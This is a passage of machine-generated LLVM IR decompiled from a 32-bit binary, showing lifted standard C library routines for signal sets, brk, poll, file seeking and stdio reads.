  %v4_804f68f = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8056de0.410 to i32), i32 %arg1, i32 %v4_804f67b, i32 %v4_804f67b)
  %v2_804f6a8 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804f6ad = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f6ad, i32* %eax.global-to-local, align 4
  %v4_804f6b6 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804f6a8)
  store i32 %v4_804f6b6, i32* %eax.global-to-local, align 4
  %v2_804f6be = icmp slt i32 %v4_804f6b6, 0
  br i1 %v2_804f6be, label %dec_label_pc_804f6c8, label %dec_label_pc_804f6c2

dec_label_pc_804f6c2:                             ; preds = %dec_label_pc_804f687
  %v3_804f6c2 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804f6cb

dec_label_pc_804f6c8:                             ; preds = %dec_label_pc_804f687, %dec_label_pc_804f670, %dec_label_pc_804f647
  br label %dec_label_pc_804f6cb

dec_label_pc_804f6cb:                             ; preds = %dec_label_pc_804f6c2, %dec_label_pc_804f6c8
  %storemerge = phi i32 [ -1, %dec_label_pc_804f6c8 ], [ %v3_804f6c2, %dec_label_pc_804f6c2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804f624, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f66d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0, 8, 9 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 1, 0, 2 }
  uselistorder i32 160, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 4, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_804f6cb, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f6e2 = add i32 %arg2, -1
  %v1_804f6e5 = urem i32 %v1_804f6e2, 32
  %v2_804f6e5 = icmp eq i32 %v1_804f6e5, 0
  %v2_804f6e8 = udiv i32 %v1_804f6e2, 32
  br i1 %v2_804f6e5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804f6eb = shl i32 1, %v1_804f6e5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f6ed = phi i32 [ 1, %entry ], [ %v5_804f6eb, %bb ]
  %v2_804f6ed = mul nuw nsw i32 %v2_804f6e8, 4
  %v3_804f6ed = add i32 %v2_804f6ed, %arg1
  %v4_804f6ed = inttoptr i32 %v3_804f6ed to i32*
  %v5_804f6ed = load i32, i32* %v4_804f6ed, align 4
  %v7_804f6ed = and i32 %v5_804f6ed, %v6_804f6ed
  %v8_804f6ed = icmp eq i32 %v7_804f6ed, 0
  %v1_804f6f1 = icmp eq i1 %v8_804f6ed, false
  %v2_804f6f1 = zext i1 %v1_804f6f1 to i32
  ret i32 %v2_804f6f1

; uselistorder directives
  uselistorder i32 %v1_804f6e5, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f6f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f6f8, i32* %stack_var_-4, align 4
  %v1_804f706 = add i32 %arg2, -1
  %v1_804f709 = urem i32 %v1_804f706, 32
  %v2_804f709 = icmp eq i32 %v1_804f709, 0
  store i32 %v1_804f709, i32* @ecx, align 4
  %v2_804f70c = udiv i32 %v1_804f706, 32
  store i32 %v2_804f70c, i32* @edx, align 4
  br i1 %v2_804f709, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804f70f = shl i32 1, %v1_804f709
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f711 = phi i32 [ 1, %entry ], [ %v5_804f70f, %bb ]
  %v2_804f711 = mul nuw nsw i32 %v2_804f70c, 4
  %v3_804f711 = add i32 %v2_804f711, %arg1
  %v4_804f711 = inttoptr i32 %v3_804f711 to i32*
  %v5_804f711 = load i32, i32* %v4_804f711, align 4
  %v7_804f711 = or i32 %v5_804f711, %v6_804f711
  store i32 %v7_804f711, i32* %v4_804f711, align 4
  %v2_804f716 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f716, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804f70c, { 1, 0 }
  uselistorder i32 %v1_804f709, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804f726 = add i32 %arg2, -1
  %v1_804f729 = urem i32 %v1_804f726, 32
  %v2_804f729 = icmp eq i32 %v1_804f729, 0
  %v2_804f72c = udiv i32 %v1_804f726, 32
  br i1 %v2_804f729, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804f72f = shl i32 -2, %v1_804f729
  %v5_804f72f = sub nsw i32 32, %v1_804f729
  %v6_804f72f = lshr i32 -2, %v5_804f72f
  %v7_804f72f = or i32 %v6_804f72f, %v4_804f72f
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f731 = phi i32 [ -2, %entry ], [ %v7_804f72f, %bb ]
  %v2_804f731 = mul nuw nsw i32 %v2_804f72c, 4
  %v3_804f731 = add i32 %v2_804f731, %arg1
  %v4_804f731 = inttoptr i32 %v3_804f731 to i32*
  %v5_804f731 = load i32, i32* %v4_804f731, align 4
  %v7_804f731 = and i32 %v5_804f731, %v6_804f731
  store i32 %v7_804f731, i32* %v4_804f731, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804f729, { 1, 2, 0 }
  uselistorder i32 -2, { 3, 5, 4, 2, 6, 0, 18, 19, 1, 15, 17, 14, 16, 21, 7, 8, 9, 20, 10, 11, 12, 13 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804f738 = load i32, i32* @eax, align 4
  %v1_804f738 = add i32 %v0_804f738, 28
  %v2_804f738 = inttoptr i32 %v1_804f738 to i32*
  %v3_804f738 = load i32, i32* %v2_804f738, align 4
  store i32 %v3_804f738, i32* @global_var_8056e60.411, align 32
  %v1_804f741 = add i32 %v0_804f738, 44
  %v2_804f741 = inttoptr i32 %v1_804f741 to i32*
  %v3_804f741 = load i32, i32* %v2_804f741, align 4
  store i32 %v3_804f741, i32* @global_var_8056e64.412, align 4
  ret i32 %v3_804f741
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f74c = load i32, i32* @ebx, align 4
  store i32 %v0_804f74c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f75f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f75f, i32* @global_var_8056a04.388, align 4
  %v7_804f76a = icmp ult i32 %v1_804f75f, %arg1
  %v1_804f76c = icmp eq i1 %v7_804f76a, false
  br i1 %v1_804f76c, label %dec_label_pc_804f77c, label %dec_label_pc_804f76e

dec_label_pc_804f76e:                             ; preds = %entry
  %v0_804f76e = load i32, i32* %stack_var_-4, align 4
  %v1_804f76e = call i32 @__errno_location(i32 %v0_804f76e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804f776 = inttoptr i32 %v1_804f76e to i32*
  store i32 12, i32* %v1_804f776, align 4
  %v0_804f77c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f77c

dec_label_pc_804f77c:                             ; preds = %entry, %dec_label_pc_804f76e
  %v0_804f77c = phi i32 [ 0, %entry ], [ %v0_804f77c.pre, %dec_label_pc_804f76e ]
  %v2_804f780 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f780, i32* @ebx, align 4
  ret i32 %v0_804f77c

; uselistorder directives
  uselistorder i32 %v1_804f75f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8056a04.388, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f77c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804f787 = load i32, i32* @eax, align 4
  %v1_804f789 = sub i32 0, %v0_804f787
  %v1_804f78b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_804f790 = inttoptr i32 %v1_804f78b to i32*
  store i32 %v1_804f789, i32* %v2_804f790, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 4, 5, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f79c = load i32, i32* @edi, align 4
  store i32 %v0_804f79c, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804f7ac = load i32, i32* @ebx, align 4
  %v1_804f7ad = inttoptr i32 %tmp4 to %pollfd*
  %v5_804f7b4 = call i32 @poll(%pollfd* %v1_804f7ad, i32 %tmp3, i32 %tmp)
  store i32 %v0_804f7ac, i32* @ebx, align 4
  store i32 %v5_804f7b4, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804f7b4, -4095
  br i1 %tmp10, label %dec_label_pc_804f7cc, label %dec_label_pc_804f7c0

dec_label_pc_804f7c0:                             ; preds = %entry
  %v1_804f7c0 = call i32 @__errno_location(i32 %v0_804f7ac)
  %v0_804f7c5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7c5 = sub i32 0, %v0_804f7c5
  %v2_804f7c7 = inttoptr i32 %v1_804f7c0 to i32*
  store i32 %v1_804f7c5, i32* %v2_804f7c7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f7cc

dec_label_pc_804f7cc:                             ; preds = %entry, %dec_label_pc_804f7c0
  %v0_804f7cc = phi i32 [ %v5_804f7b4, %entry ], [ -1, %dec_label_pc_804f7c0 ]
  %v2_804f7d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f7d0, i32* @edi, align 4
  ret i32 %v0_804f7cc

; uselistorder directives
  uselistorder i32 %v5_804f7b4, { 1, 0, 2 }
  uselistorder i32 %v0_804f7ac, { 1, 0 }
  uselistorder label %dec_label_pc_804f7cc, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f7df = ashr i32 %arg2, 31
  %v4_804f7e6 = inttoptr i32 %arg1 to i16*
  %v5_804f7e6 = call i32 @__GI_fseeko64(i16* %v4_804f7e6, i32 %arg2, i32 %v1_804f7df, i32 %arg3)
  ret i32 %v5_804f7e6
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804f7f0 = load i32, i32* @ebp, align 4
  %v0_804f7f1 = load i32, i32* @edi, align 4
  %v0_804f7f2 = load i32, i32* @esi, align 4
  %v0_804f7f3 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804f803 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f803, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_804f827, label %dec_label_pc_804f814

dec_label_pc_804f814:                             ; preds = %entry
  %v1_804f814 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_804f814, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_804f81c = inttoptr i32 %v1_804f814 to i32*
  store i32 22, i32* %v1_804f81c, align 4
  br label %dec_label_pc_804f8c9

dec_label_pc_804f827:                             ; preds = %entry
  %v1_804f827 = add i32 %v4_804f803, 52
  %v2_804f827 = inttoptr i32 %v1_804f827 to i32*
  %v3_804f827 = load i32, i32* %v2_804f827, align 4
  %v1_804f82a = icmp eq i32 %v3_804f827, 0
  %v1_804f82c = icmp eq i1 %v1_804f82a, false
  br i1 %v1_804f82c, label %dec_label_pc_804f84d, label %dec_label_pc_804f82e

dec_label_pc_804f82e:                             ; preds = %dec_label_pc_804f827
  %v1_804f82e = add i32 %v4_804f803, 56
  store i32 %v1_804f82e, i32* @ebx, align 4
  %v2_804f838 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f838, i32* @eax, align 4
  %v3_804f83d = call i32 @__pthread_return_void(i32 %v2_804f838, i32 134534955)
  store i32 %v3_804f83d, i32* %eax.global-to-local, align 4
  %v0_804f842 = load i32, i32* @ebx, align 4
  %v2_804f845 = call i32 @__pthread_return_0(i32 %v0_804f842)
  store i32 %v2_804f845, i32* %eax.global-to-local, align 4
  %v0_804f84d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f84d

dec_label_pc_804f84d:                             ; preds = %dec_label_pc_804f827, %dec_label_pc_804f82e
  %v0_804f855 = phi i32 [ %v4_804f803, %dec_label_pc_804f827 ], [ %v0_804f84d.pre, %dec_label_pc_804f82e ]
  %v1_804f84d = inttoptr i32 %v0_804f855 to i8*
  %v2_804f84d = load i8, i8* %v1_804f84d, align 1
  %v3_804f84d = and i8 %v2_804f84d, 64
  %v4_804f84d = icmp eq i8 %v3_804f84d, 0
  br i1 %v4_804f84d, label %dec_label_pc_804f862, label %dec_label_pc_804f852

dec_label_pc_804f852:                             ; preds = %dec_label_pc_804f84d
  %v2_804f856 = call i32 @__stdio_wcommit(i32 %v0_804f855)
  store i32 %v2_804f856, i32* %eax.global-to-local, align 4
  %v1_804f85e = icmp eq i32 %v2_804f856, 0
  %v1_804f860 = icmp eq i1 %v1_804f85e, false
  br i1 %v1_804f860, label %dec_label_pc_804f8b1, label %dec_label_pc_804f862

dec_label_pc_804f862:                             ; preds = %dec_label_pc_804f852, %dec_label_pc_804f84d
  %v0_804f862 = load i32, i32* @edi, align 4
  %v9_804f862 = icmp eq i32 %v0_804f862, 1
  %v1_804f865 = icmp eq i1 %v9_804f862, false
  br i1 %v1_804f865, label %dec_label_pc_804f862.dec_label_pc_804f87b_crit_edge, label %dec_label_pc_804f867

dec_label_pc_804f862.dec_label_pc_804f87b_crit_edge: ; preds = %dec_label_pc_804f862
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804f87b

dec_label_pc_804f867:                             ; preds = %dec_label_pc_804f862
  %v0_804f867 = load i32, i32* @ecx, align 4
  %v2_804f869 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804f869, i32* %eax.global-to-local, align 4
  %v0_804f86e = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_804f86e to i32*
  %v6_804f86f = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_804f869, i32 %v0_804f867, i32 %v0_804f867)
  store i32 %v6_804f86f, i32* %eax.global-to-local, align 4
  %v2_804f877 = icmp slt i32 %v6_804f86f, 0
  br i1 %v2_804f877, label %dec_label_pc_804f8b1, label %dec_label_pc_804f867.dec_label_pc_804f87b_crit_edge

dec_label_pc_804f867.dec_label_pc_804f87b_crit_edge: ; preds = %dec_label_pc_804f867
  %v0_804f87c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f87b

dec_label_pc_804f87b:                             ; preds = %dec_label_pc_804f862.dec_label_pc_804f87b_crit_edge, %dec_label_pc_804f867.dec_label_pc_804f87b_crit_edge
  %v2_804f87d.pre-phi = phi i32 [ %.pre6, %dec_label_pc_804f862.dec_label_pc_804f87b_crit_edge ], [ %v2_804f869, %dec_label_pc_804f867.dec_label_pc_804f87b_crit_edge ]
  %v0_804f87c = phi i32 [ %v0_804f862, %dec_label_pc_804f862.dec_label_pc_804f87b_crit_edge ], [ %v0_804f87c.pre, %dec_label_pc_804f867.dec_label_pc_804f87b_crit_edge ]
  %v0_804f87b = load i32, i32* @edx, align 4
  store i32 %v2_804f87d.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804f882 = load i32, i32* @esi, align 4
  %v5_804f883 = inttoptr i32 %v2_804f87d.pre-phi to i32*
  %v6_804f883 = call i32 @__stdio_seek(i32 %v0_804f882, i32* %v5_804f883, i32 %v0_804f87c, i32 %v0_804f87b)
  store i32 %v6_804f883, i32* %eax.global-to-local, align 4
  %v2_804f88b = icmp slt i32 %v6_804f883, 0
  br i1 %v2_804f88b, label %dec_label_pc_804f8b1, label %dec_label_pc_804f88f

dec_label_pc_804f88f:                             ; preds = %dec_label_pc_804f87b
  %v0_804f88f = load i32, i32* @esi, align 4
  %v1_804f88f = inttoptr i32 %v0_804f88f to i16*
  %v2_804f88f = load i16, i16* %v1_804f88f, align 2
  %v3_804f88f = and i16 %v2_804f88f, -72
  store i16 %v3_804f88f, i16* %v1_804f88f, align 2
  %v0_804f893 = load i32, i32* @esi, align 4
  %v1_804f893 = add i32 %v0_804f893, 8
  %v2_804f893 = inttoptr i32 %v1_804f893 to i32*
  %v3_804f893 = load i32, i32* %v2_804f893, align 4
  store i32 %v3_804f893, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_804f898 = add i32 %v0_804f893, 16
  %v3_804f898 = inttoptr i32 %v2_804f898 to i32*
  store i32 %v3_804f893, i32* %v3_804f898, align 4
  %v0_804f89b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f89b = load i32, i32* @esi, align 4
  %v2_804f89b = add i32 %v1_804f89b, 20
  %v3_804f89b = inttoptr i32 %v2_804f89b to i32*
  store i32 %v0_804f89b, i32* %v3_804f89b, align 4
  %v0_804f89e = load i32, i32* %eax.global-to-local, align 4
  %v1_804f89e = load i32, i32* @esi, align 4
  %v2_804f89e = add i32 %v1_804f89e, 24
  %v3_804f89e = inttoptr i32 %v2_804f89e to i32*
  store i32 %v0_804f89e, i32* %v3_804f89e, align 4
  %v0_804f8a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f8a1 = load i32, i32* @esi, align 4
  %v2_804f8a1 = add i32 %v1_804f8a1, 28
  %v3_804f8a1 = inttoptr i32 %v2_804f8a1 to i32*
  store i32 %v0_804f8a1, i32* %v3_804f8a1, align 4
  %v0_804f8a4 = load i32, i32* @esi, align 4
  %v1_804f8a4 = add i32 %v0_804f8a4, 44
  %v2_804f8a4 = inttoptr i32 %v1_804f8a4 to i32*
  store i32 0, i32* %v2_804f8a4, align 4
  %v0_804f8ab = load i32, i32* @esi, align 4
  %v1_804f8ab = add i32 %v0_804f8ab, 2
  %v2_804f8ab = inttoptr i32 %v1_804f8ab to i8*
  store i8 0, i8* %v2_804f8ab, align 1
  br label %dec_label_pc_804f8b4

dec_label_pc_804f8b1:                             ; preds = %dec_label_pc_804f87b, %dec_label_pc_804f867, %dec_label_pc_804f852
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f8b4

dec_label_pc_804f8b4:                             ; preds = %dec_label_pc_804f88f, %dec_label_pc_804f8b1
  br i1 %v1_804f82c, label %dec_label_pc_804f8c9, label %dec_label_pc_804f8b8

dec_label_pc_804f8b8:                             ; preds = %dec_label_pc_804f8b4
  %v2_804f8bc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f8bc, i32* @eax, align 4
  %v3_804f8c1 = call i32 @__pthread_return_void(i32 %v2_804f8bc, i32 1)
  store i32 %v3_804f8c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8c9

dec_label_pc_804f8c9:                             ; preds = %dec_label_pc_804f8b4, %dec_label_pc_804f814, %dec_label_pc_804f8b8
  %v0_804f8cc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f8cc, i32* %eax.global-to-local, align 4
  store i32 %v0_804f7f3, i32* @ebx, align 4
  store i32 %v0_804f7f2, i32* @esi, align 4
  store i32 %v0_804f7f1, i32* @edi, align 4
  store i32 %v0_804f7f0, i32* @ebp, align 4
  ret i32 %v0_804f8cc

; uselistorder directives
  uselistorder i32 %v2_804f87d.pre-phi, { 1, 0 }
  uselistorder i32 %v0_804f862, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 9, 19, 18, 17, 16, 15, 14, 13, 4, 31, 33, 32, 27, 3, 2, 1, 11, 30, 12, 10, 8, 7, 6, 23, 22, 29, 5, 28, 0, 21, 20, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 10, 9, 45, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 1, 0, 55, 54, 59, 58, 57, 56, 47, 46, 14, 13, 53, 52, 16, 15, 12, 11, 34, 8, 7, 6, 5, 4, 38, 37, 36, 35, 51, 50, 3, 2, 49, 48, 33, 32, 31, 30, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134534955, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 14, 15, 16, 17, 18, 23, 24, 25, 26, 19 }
  uselistorder i32 52, { 13, 1, 10, 0, 2, 3, 4, 11, 12, 5, 8, 6, 14, 15, 9, 7 }
  uselistorder i32 22, { 8, 11, 12, 6, 0, 1, 2, 3, 7, 9, 10, 5, 4 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f8c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f8b4, { 1, 0 }
  uselistorder label %dec_label_pc_804f87b, { 1, 0 }
  uselistorder label %dec_label_pc_804f84d, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f8d4 = load i32, i32* @ebx, align 4
  store i32 %v0_804f8d4, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_804f8da = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f8da, i32* @ebx, align 4
  %v1_804f8e2 = bitcast i16* %arg1 to i8*
  %v2_804f8e2 = load i8, i8* %v1_804f8e2, align 1
  %v3_804f8e2 = and i8 %v2_804f8e2, 4
  %v4_804f8e2 = icmp eq i8 %v3_804f8e2, 0
  %v1_804f8e5 = icmp eq i1 %v4_804f8e2, false
  br i1 %v1_804f8e5, label %dec_label_pc_804f914, label %dec_label_pc_804f8e7

dec_label_pc_804f8e7:                             ; preds = %entry
  %v2_804f8e7 = icmp slt i32 %arg3, 0
  %v1_804f8e9 = icmp eq i1 %v2_804f8e7, false
  br i1 %v1_804f8e9, label %dec_label_pc_804f8f0, label %dec_label_pc_804f8eb

dec_label_pc_804f8eb:                             ; preds = %dec_label_pc_804f8e7
  br label %dec_label_pc_804f8f0

dec_label_pc_804f8f0:                             ; preds = %dec_label_pc_804f8e7, %dec_label_pc_804f8eb
  %v0_804f8f1 = phi i32 [ %arg3, %dec_label_pc_804f8e7 ], [ 2147483647, %dec_label_pc_804f8eb ]
  %v1_804f8f6 = add i32 %v4_804f8da, 4
  %v2_804f8f6 = inttoptr i32 %v1_804f8f6 to i32*
  %v3_804f8f6 = load i32, i32* %v2_804f8f6, align 4
  %v4_804f8f9 = inttoptr i32 %arg2 to i32*
  %v5_804f8f9 = call i32 @__libc_read(i32 %v3_804f8f6, i32* %v4_804f8f9, i32 %v0_804f8f1, i32 0)
  store i32 %v5_804f8f9, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v5_804f8f9, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_804f914, label %dec_label_pc_804f906

dec_label_pc_804f906:                             ; preds = %dec_label_pc_804f8f0
  %v1_804f901 = icmp eq i32 %v5_804f8f9, 0
  %v4_804f904 = icmp eq i1 %v1_804f901, false
  %v0_804f90e = load i32, i32* @ebx, align 4
  %v1_804f90e = inttoptr i32 %v0_804f90e to i16*
  %v2_804f90e = load i16, i16* %v1_804f90e, align 2
  br i1 %v4_804f904, label %dec_label_pc_804f90e, label %dec_label_pc_804f908

dec_label_pc_804f908:                             ; preds = %dec_label_pc_804f906
  %v3_804f908 = or i16 %v2_804f90e, 4
  store i16 %v3_804f908, i16* %v1_804f90e, align 2
  %v0_804f917.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f914

dec_label_pc_804f90e:                             ; preds = %dec_label_pc_804f906
  %v3_804f90e = or i16 %v2_804f90e, 8
  store i16 %v3_804f90e, i16* %v1_804f90e, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f914

dec_label_pc_804f914:                             ; preds = %dec_label_pc_804f8f0, %entry, %dec_label_pc_804f908, %dec_label_pc_804f90e
  %v0_804f917 = phi i32 [ %v5_804f8f9, %dec_label_pc_804f8f0 ], [ 0, %entry ], [ %v0_804f917.pre, %dec_label_pc_804f908 ], [ 0, %dec_label_pc_804f90e ]
  %v2_804f916 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f916, i32* @ebx, align 4
  ret i32 %v0_804f917

; uselistorder directives
  uselistorder i16 %v2_804f90e, { 1, 0 }
  uselistorder i32 %v5_804f8f9, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f914, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804f8f0, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_804f928 = load i32, i32* %arg1, align 4
  store i32 %v2_804f928, i32* %esi.global-to-local, align 4
  %v1_804f92f = urem i32 %v2_804f928, 4
  %v2_804f92f = icmp eq i32 %v1_804f92f, 0
  store i32 %v1_804f92f, i32* %ecx.global-to-local, align 4
  br i1 %v2_804f92f, label %dec_label_pc_804f95e, label %dec_label_pc_804f934

dec_label_pc_804f934:                             ; preds = %entry
  %v1_804f936 = add nsw i32 %v1_804f92f, -1
  %v8_804f936 = icmp eq i32 %v1_804f936, 0
  store i32 %v1_804f936, i32* @edx, align 4
  br i1 %v8_804f936, label %dec_label_pc_804f95e, label %dec_label_pc_804f939

dec_label_pc_804f939:                             ; preds = %dec_label_pc_804f934
  %v3_804f939 = and i32 %v2_804f928, 2048
  %v4_804f939 = icmp eq i32 %v3_804f939, 0
  br i1 %v4_804f939, label %dec_label_pc_804f95e, label %dec_label_pc_804f93e

dec_label_pc_804f93e:                             ; preds = %dec_label_pc_804f939
  %v6_804f93e = sub nsw i32 1, %v1_804f92f
  %v7_804f93e = and i32 %v1_804f936, %v6_804f93e
  %v8_804f93e = icmp slt i32 %v7_804f93e, 0
  %v9_804f93e = icmp eq i32 %v1_804f92f, 2
  %v10_804f93e = icmp ult i32 %v1_804f92f, 2
  %v3_804f941 = icmp eq i1 %v10_804f93e, %v8_804f93e
  %v4_804f941 = icmp eq i1 %v9_804f93e, false
  %v5_804f941 = and i1 %v4_804f941, %v3_804f941
  br i1 %v5_804f941, label %dec_label_pc_804f9b4, label %dec_label_pc_804f943

dec_label_pc_804f943:                             ; preds = %dec_label_pc_804f93e
  %v1_804f943 = add i32 %tmp6, 40
  %v2_804f943 = inttoptr i32 %v1_804f943 to i32*
  %v3_804f943 = load i32, i32* %v2_804f943, align 4
  %v4_804f943 = icmp eq i32 %v3_804f943, 0
  %v1_804f947 = icmp eq i1 %v4_804f943, false
  br i1 %v1_804f947, label %dec_label_pc_804f9b4, label %dec_label_pc_804f949

dec_label_pc_804f949:                             ; preds = %dec_label_pc_804f943
  %v1_804f949 = add i32 %tmp6, 3
  %v2_804f949 = inttoptr i32 %v1_804f949 to i8*
  %v3_804f949 = load i8, i8* %v2_804f949, align 1
  %v4_804f949 = zext i8 %v3_804f949 to i32
  %v2_804f94d = sub nsw i32 %v1_804f936, %v4_804f949
  %v1_804f94f = add i32 %tmp6, 44
  %v2_804f94f = inttoptr i32 %v1_804f94f to i32*
  %v3_804f94f = load i32, i32* %v2_804f94f, align 4
